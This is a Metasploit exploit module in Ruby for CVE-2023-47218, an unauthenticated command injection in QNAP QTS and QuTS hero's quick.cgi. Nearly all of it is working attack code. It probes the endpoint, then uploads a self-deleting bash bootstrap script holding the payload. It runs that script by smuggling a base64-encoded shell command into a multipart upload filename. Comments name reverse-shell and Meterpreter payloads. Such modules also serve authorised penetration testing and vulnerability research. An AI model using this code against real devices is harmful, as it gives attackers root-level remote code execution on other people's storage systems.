##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'QNAP QTS and QuTS Hero Unauthenticated Remote Code Execution in quick.cgi',
        'Description' => %q{
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sfewer-r7',
        ],
        'References' => [
          ['CVE', '2023-47218'],
          ['URL', 'https://www.qnap.com/en/security-advisory/qsa-23-57'],
          ['URL', 'https://www.rapid7.com/blog/post/2024/02/13/cve-2023-47218-qnap-qts-and-quts-hero-unauthenticated-command-injection-fixed']
        ],
        'DisclosureDate' => '2024-02-13',
        'Platform' => %w[unix linux],
        'Arch' => [ARCH_CMD],
        'Privileged' => true,
        'Targets' => [ [ 'Default', {} ] ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 80,
          'SSL' => false,
          'FETCH_WRITABLE_DIR' => '/mnt/update'
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => '/cgi-bin/quick/quick.cgi',
      'vars_get' => {
        'func' => Rex::Text.rand_text_alphanumeric(8)
      }
    )

    return CheckCode::Unknown('Connection failed') unless res

    return CheckCode::Safe if res.code == 404

    return CheckCode::Unknown("Received unexpected HTTP status code: #{res.code}.") unless res.code == 200

    # This is the content data we get back from a vulnerable system (testing firmware TS-X64_20230926-5.1.2.2533):

    # <?xml version="1.0" encoding="UTF-8"?>
    # <Storage>
    # <Result>failure</Result>
    # <Errcode>801</Errcode>
    # <Errmsg>
    # No Parameter.
    # </Errmsg>
    # </Storage>

    return Exploit::CheckCode::Detected if res.body.include? '<Result>failure</Result>'

    CheckCode::Unknown
  end

  # XXX: currently testing with these payloads:
  # cmd/unix/reverse_bash
  # cmd/linux/http/x64/meterpreter/reverse_tcp

  def exploit
    # XXX: the command injection has a limit of 127 characters, so we drop our payload to a file and then execute that file.
    bootstrap_file = Rex::Text.rand_text_alphanumeric(8)

    mutex_file = Rex::Text.rand_text_alphanumeric(8)

    bootstrap_script = [
      '#!/bin/bash',
      "cd #{datastore['FETCH_WRITABLE_DIR']}",
      # Try to avoid multiple sessions by creation a directory (should be atomic) and then bailing out if the directory
      # already exists.
      "if ! mkdir #{mutex_file} 2>/dev/null; then exit; fi",
      # XXX: Are files a better open than a directory?
      # "if [[ -f #{mutex_file} ]]; then exit; fi",
      # "touch #{mutex_file}",
      'rm -f $0',
      payload.encoded
    ].join("\n")

    upload_file(bootstrap_file, bootstrap_script)

    # XXX: delete the mutex_file (dir or file) when we get a session. (Msf::Exploit::FileDropper)

    # XXX: the command will write a file to /mnt/update. As we control the contents, we could
    # find all files with this content and delete it.
    execute_command("bash #{datastore['FETCH_WRITABLE_DIR']}/#{bootstrap_file}")
  end

  def execute_command(cmd)
    cmd_injection = Rex::Text.uri_encode("\"$($(echo -n #{Base64.strict_encode64(cmd)}|base64 -d))\"")

    upload_file(cmd_injection, Rex::Text.rand_text_alphanumeric(8))
  end

  def upload_file(file_name, file_data)
    if file_name.length > 127
      fail_with(Failure::BadConfig, "The upload file name is too long (#{file_name.length}), must be < 128 bytes.")
    end

    data = Rex::MIME::Message.new
    data.add_part(file_data, 'text/plain', 'binary', "form-data; #{Rex::Text.rand_text_alphanumeric(8)}=\"#{Rex::Text.rand_text_alphanumeric(8)}\"; #{Rex::Text.rand_text_alphanumeric(8)}=\"#{file_name}\"")

    send_request_cgi(
      'method' => 'POST',
      'uri' => '/cgi-bin/quick/quick.cgi',
      'vars_get' => {
        'func' => 'switch_os',
        'todo' => 'uploaf_firmware_image'
      },
      'headers' => {
        'User-Agent' => 'Mozilla Macintosh'
      },
      'ctype' => "multipart/form-data;boundary=\"#{data.bound}\"",
      'data' => data.to_s
    )
  end
end
